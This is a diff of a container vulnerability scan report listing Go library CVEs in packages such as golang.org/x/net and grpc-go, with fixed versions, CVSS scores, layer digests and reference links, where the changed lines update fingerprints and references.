 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:2538c7c47122fb40dff14a58f1df2b5249c30fc8dffc5da3304017af2aba64aa 
+│     │      ├ Fingerprint     : sha256:16ec3a1a02c2017ec99ed1aa758f147b1a62a81f168246263816be4eeb223194 
 │     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Arbitrary code execution via
 │     │      │                   Cross-Site Scripting 
 │     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
@@ -1278,39 +871,38 @@
 │     │      │                  ╰ rocky      : 3 
 │     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
 │     │      │                           ╰ V3Score : 8.1 
-│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
+│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:34357 
 │     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-25681 
-│     │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
-│     │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
-│     │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
-│     │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
-│     │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
-│     │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
-│     │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
-│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
-│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
-│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
-│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
-│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
-│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
-│     │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
-│     │      │                  ├ [16]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
-│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
-│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
-│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
-│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
-│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
-│     │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
-│     │      │                  ├ [23]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
-│     │      │                  ├ [24]: https://errata.rockylinux.org/RLSA-2026:37123 
-│     │      │                  ├ [25]: https://go.dev/cl/781703 
-│     │      │                  ├ [26]: https://go.dev/issue/79574 
-│     │      │                  ├ [27]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
-│     │      │                  ├ [28]: https://linux.oracle.com/cve/CVE-2026-25681.html 
-│     │      │                  ├ [29]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
-│     │      │                  ├ [30]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
-│     │      │                  ├ [31]: https://pkg.go.dev/vuln/GO-2026-5029 
-│     │      │                  ╰ [32]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
+│     │      │                  ├ [2] : https://bugzilla.redhat.com/2466505 
+│     │      │                  ├ [3] : https://bugzilla.redhat.com/2466507 
+│     │      │                  ├ [4] : https://bugzilla.redhat.com/2467822 
+│     │      │                  ├ [5] : https://bugzilla.redhat.com/2480756 
+│     │      │                  ├ [6] : https://bugzilla.redhat.com/2480761 
+│     │      │                  ├ [7] : https://bugzilla.redhat.com/2484207 
+│     │      │                  ├ [8] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
+│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
+│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
+│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
+│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
+│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
+│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
+│     │      │                  ├ [15]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
+│     │      │                  ├ [16]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
+│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
+│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
+│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
+│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
+│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
+│     │      │                  ├ [22]: https://errata.almalinux.org/10/ALSA-2026-34357.html 
+│     │      │                  ├ [23]: https://errata.rockylinux.org/RLSA-2026:37123 
+│     │      │                  ├ [24]: https://go.dev/cl/781703 
+│     │      │                  ├ [25]: https://go.dev/issue/79574 
+│     │      │                  ├ [26]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
+│     │      │                  ├ [27]: https://linux.oracle.com/cve/CVE-2026-25681.html 
+│     │      │                  ├ [28]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
+│     │      │                  ├ [29]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
+│     │      │                  ├ [30]: https://pkg.go.dev/vuln/GO-2026-5029 
+│     │      │                  ╰ [31]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
 │     │      ├ PublishedDate   : 2026-05-22T16:16:19.863Z 
 │     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
 │     ├ [7]  ╭ VulnerabilityID : CVE-2026-27136 
@@ -1322,13 +914,13 @@
 │     │      ├ InstalledVersion: v0.51.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27136 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:9de7ad71e2d43f7ef235c57ad9a01324120dcdd3d8ca498cf7691e42952bae6d 
+│     │      ├ Fingerprint     : sha256:5a77cf4257afd9decd48f28631b2c887cda9f15252d797c51a39855894386fd6 
 │     │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via
 │     │      │                    HTML parsing bypass 
 │     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
@@ -1388,14 +980,14 @@
 │     │      ├ InstalledVersion: v0.51.0 
 │     │      ├ FixedVersion    : 0.53.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:02b7c28f1e3f33f382e21fc16762d6961db9e2120647f7ed187f6915d784e694 
+│     │      ├ Fingerprint     : sha256:5500faf1e651383d499d99f0cfe9c8cd9a6a69e2a875c715498e229ed0c0f6f8 
 │     │      ├ Title           : net/http/internal/http2: golang: golang.org/x/net: Go HTTP/2: Denial of
 │     │      │                   Service via malformed SETTINGS_MAX_FRAME_SIZE frame 
 │     │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
@@ -1459,13 +1051,13 @@
 │     │      ├ InstalledVersion: v0.51.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39821 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:201eea860e913af70b6353d95d4f3a8cdc1eda7fdfe4da6c0c1b813d2cd9650c 
+│     │      ├ Fingerprint     : sha256:b22efb5a3ae979fa29ba843a0e381b0a0b00ac5fbc71076859bb94fd1df18c5f 
 │     │      ├ Title           : golang.org/x/net/idna: golang: net/http: golang.org/x/net/idna: Privilege
 │     │      │                   escalation via incorrect Punycode label processing 
 │     │      ├ Description     : The ToASCII and ToUnicode functions incorrectly accept Punycode-encoded labels
@@ -1576,24 +1168,25 @@
 │     │      │                  ├ [85] : https://access.redhat.com/errata/RHSA-2026:47952 
 │     │      │                  ├ [86] : https://access.redhat.com/security/cve/CVE-2026-39821 
 │     │      │                  ├ [87] : https://bugzilla.redhat.com/2480756 
-│     │      │                  ├ [88] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
-│     │      │                  ├ [89] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
-│     │      │                  ├ [90] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
-│     │      │                  ├ [91] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
-│     │      │                  ├ [92] : https://errata.almalinux.org/9/ALSA-2026-37435.html 
-│     │      │                  ├ [93] : https://errata.rockylinux.org/RLSA-2026:37435 
-│     │      │                  ├ [94] : https://github.com/golang/go/issues/78760 
-│     │      │                  ├ [95] : https://go.dev/cl/767220 
-│     │      │                  ├ [96] : https://go.dev/issue/78760 
-│     │      │                  ├ [97] : https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
-│     │      │                  ├ [98] : https://linux.oracle.com/cve/CVE-2026-39821.html 
-│     │      │                  ├ [99] : https://linux.oracle.com/errata/ELSA-2026-46395.html 
-│     │      │                  ├ [100]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
-│     │      │                  ├ [101]: https://pkg.go.dev/vuln/GO-2026-5026 
-│     │      │                  ├ [102]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-3982
+│     │      │                  ├ [88] : https://bugzilla.redhat.com/2484207 
+│     │      │                  ├ [89] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
+│     │      │                  ├ [90] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
+│     │      │                  ├ [91] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
+│     │      │                  ├ [92] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
+│     │      │                  ├ [93] : https://errata.almalinux.org/10/ALSA-2026-46395.html 
+│     │      │                  ├ [94] : https://errata.rockylinux.org/RLSA-2026:37435 
+│     │      │                  ├ [95] : https://github.com/golang/go/issues/78760 
+│     │      │                  ├ [96] : https://go.dev/cl/767220 
+│     │      │                  ├ [97] : https://go.dev/issue/78760 
+│     │      │                  ├ [98] : https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
+│     │      │                  ├ [99] : https://linux.oracle.com/cve/CVE-2026-39821.html 
+│     │      │                  ├ [100]: https://linux.oracle.com/errata/ELSA-2026-46395.html 
+│     │      │                  ├ [101]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
+│     │      │                  ├ [102]: https://pkg.go.dev/vuln/GO-2026-5026 
+│     │      │                  ├ [103]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-3982
 │     │      │                  │        1.json 
-│     │      │                  ├ [103]: https://ubuntu.com/security/notices/USN-8416-1 
-│     │      │                  ╰ [104]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
+│     │      │                  ├ [104]: https://ubuntu.com/security/notices/USN-8416-1 
+│     │      │                  ╰ [105]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
 │     │      ├ PublishedDate   : 2026-05-22T16:16:20.41Z 
 │     │      ╰ LastModifiedDate: 2026-07-31T13:18:09.37Z 
 │     ├ [10] ╭ VulnerabilityID : CVE-2026-25680 
@@ -1605,13 +1198,13 @@
 │     │      ├ InstalledVersion: v0.51.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25680 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:e2f0fa222dd9b93a8fb8df34aba5a0fc1a780e85b2d248b4805bda663c1625b9 
+│     │      ├ Fingerprint     : sha256:650a4e985d32c65f3023943b43141e41ddf8311cf7b9072d639109887ba1031f 
 │     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Denial of Service due to
 │     │      │                   excessive HTML parsing 
 │     │      ├ Description     : Parsing arbitrary HTML can consume excessive CPU time, possibly leading to
@@ -1641,13 +1234,13 @@
 │     │      ├ InstalledVersion: v0.51.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42502 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:164577a5d61c83d8843eb92764fede69d19c6d7856e6d06f80a28f1a6e68441e 
+│     │      ├ Fingerprint     : sha256:769bbcd7d58b9a7ef1a25ec8071e3f9f1928cbf94d6e13995c8cde1937f925c2 
 │     │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via
 │     │      │                    unexpected HTML tree rendering 
 │     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
@@ -1678,13 +1271,13 @@
 │     │      ├ InstalledVersion: v0.51.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42506 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:03e4e3d296f452dd76483afadba198430435338059397cbd25a8c4894f319c7d 
+│     │      ├ Fingerprint     : sha256:24ff3fedf40fe29022837c35b96f25bba105c008ca50b07b1529d2ed6907fabb 
 │     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Cross-Site Scripting (XSS) via
 │     │      │                   arbitrary HTML parsing 
 │     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
@@ -1715,13 +1308,13 @@
 │     │      ├ InstalledVersion: v0.51.0 
 │     │      ├ FixedVersion    : 0.56.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:f24d4a6251dd789511f7c4cd1da621d83ffc485e4b37a7465dc269c7f580a8fc 
+│     │      ├ Fingerprint     : sha256:b898e6e25c3faf7c746a612eb0c31886a85a6e64eb56e9ddfebbc8c9bfb137ee 
 │     │      ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ... 
 │     │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter
 │     │      │                   value overflows the message buffer. 
@@ -1741,13 +1334,13 @@
 │     │      ├ InstalledVersion: v0.42.0 
 │     │      ├ FixedVersion    : 0.44.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39824 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:9dda512a4b59acdc8fc466e0902b1650f1b30650d79f0f2239f82490ea095bb7 
+│     │      ├ Fingerprint     : sha256:e8ebbe5856441b0a9752a1c74e99f9f1b8e10352a383b67f9002bea58c701aa4 
 │     │      ├ Title           : Invoking integer overflow in NewNTUnicodeString in golang.org/x/sys/windows 
 │     │      ├ Description     : NewNTUnicodeString does not check for string length overflow. When provided
 │     │      │                   with a string that overflows the maximum size of a NTUnicodeString (a 16-bit
@@ -1769,13 +1362,13 @@
 │     │      ├ InstalledVersion: v0.35.0 
 │     │      ├ FixedVersion    : 0.39.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:c05dbf416feab9a29c5cf4758dc1fe0e00daf4a4cac1c328a9fd78f803fe792b 
+│     │      ├ Fingerprint     : sha256:ac9a3767c68e8f98933d38e48d6dd4b23fd1e4c910e91cca004b05a157e5d853 
 │     │      ├ Title           : A norm.Iter can enter an infinite loop when handling input containing  ... 
 │     │      ├ Description     : A norm.Iter can enter an infinite loop when handling input containing invalid
 │     │      │                   UTF-8 bytes. 
@@ -1796,14 +1389,14 @@
 │     │      ├ InstalledVersion: v1.80.0 
 │     │      ├ FixedVersion    : 1.82.1 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:23ed2ee419e7f6f0ab383366d6dc5795801a21ec6a70534b2250d65adb668d49 
+│     │      ├ Fingerprint     : sha256:e84bfb6f3a0d2e1586fdbdfbd4444112fdbb65623f6526ab8ed26cb85a39dc62 
 │     │      ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
 │     │      ├ Description     : Multiple security vulnerabilities have been identified and addressed in
 │     │      │                   grpc-go affecting the xDS RBAC authorization engine (internal/xds/rbac) and
@@ -1902,13 +1495,13 @@
 │     │      ├ InstalledVersion: v1.26.3 
 │     │      ├ FixedVersion    : 1.25.11, 1.26.4 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27145 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:1abc066a4a19fc04c722884343673f4e0f68f0322514af52b5e49505969d8b45 
+│     │      ├ Fingerprint     : sha256:0b0c1d9e639eee1860bba04138383f83831a86d2dc0e54c904d4132261e0b405 
 │     │      ├ Title           : crypto/x509: golang: golang crypto/x509: Denial of Service via excessive
 │     │      │                   processing of DNS SAN entries 
 │     │      ├ Description     : (*x509.Certificate).VerifyHostname previously called matchHostnames in a loop
@@ -1969,13 +1562,13 @@
 │     │      │                  ├ [36]: https://access.redhat.com/errata/RHSA-2026:47735 
 │     │      │                  ├ [37]: https://access.redhat.com/errata/RHSA-2026:47737 
 │     │      │                  ├ [38]: https://access.redhat.com/security/cve/CVE-2026-27145 
-│     │      │                  ├ [39]: https://bugzilla.redhat.com/2445356 
+│     │      │                  ├ [39]: https://bugzilla.redhat.com/2480756 
 │     │      │                  ├ [40]: https://bugzilla.redhat.com/2484207 
 │     │      │                  ├ [41]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
 │     │      │                  ├ [42]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
 │     │      │                  ├ [43]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
 │     │      │                  ├ [44]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
-│     │      │                  ├ [45]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
+│     │      │                  ├ [45]: https://errata.almalinux.org/10/ALSA-2026-46395.html 
 │     │      │                  ├ [46]: https://errata.rockylinux.org/RLSA-2026:36317 
 │     │      │                  ├ [47]: https://go.dev/cl/783621 
 │     │      │                  ├ [48]: https://go.dev/issue/79694 
@@ -1998,13 +1591,13 @@
 │     │      ├ InstalledVersion: v1.26.3 
 │     │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39822 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:8d431d31bf3d6656cdfc8023a812ab98d8fcc0b0584cde4d5496adb3970b6703 
+│     │      ├ Fingerprint     : sha256:77ed591125de71adab4f29ed0b6f18f64518b4899b2de4a0fadb2415457b3094 
 │     │      ├ Title           : os: golang: Go os.Root: Symlink following vulnerability allows directory
 │     │      │                   traversal 
 │     │      ├ Description     : On Unix systems, opening a file in an os.Root improperly follows symlinks to
@@ -2024,12 +1617,12 @@
 │     │      │                  │         ╰ V3Score : 7.8 
 │     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
 │     │      │                            ╰ V3Score : 7.8 
-│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
+│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38495 
 │     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
 │     │      │                  ├ [2] : https://bugzilla.redhat.com/2498152 
 │     │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
 │     │      │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
-│     │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
+│     │      │                  ├ [5] : https://errata.almalinux.org/10/ALSA-2026-38495.html 
 │     │      │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:38878 
 │     │      │                  ├ [7] : https://go.dev/cl/797880 
 │     │      │                  ├ [8] : https://go.dev/issue/79005 
@@ -2050,13 +1643,13 @@
